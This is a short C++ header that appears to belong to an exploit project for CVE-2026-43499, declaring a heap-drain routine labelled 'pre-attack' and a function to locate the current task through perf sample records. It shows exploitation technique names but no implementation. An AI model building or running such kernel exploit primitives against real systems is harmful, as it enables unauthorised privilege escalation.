#ifndef GHOSTLOCK_BACKEND_CVE_2026_43499_PRIMITIVES_HPP
#define GHOSTLOCK_BACKEND_CVE_2026_43499_PRIMITIVES_HPP

#include <cstdint>

namespace ghostlock::backend {
    /* Pre-attack heap drain (fork/kill/reap waves). */
    void slab_drain(void);

    /* Find the current task through perf sample records. */
    uintptr_t perf_find_task(void);
} // namespace ghostlock::backend

#endif
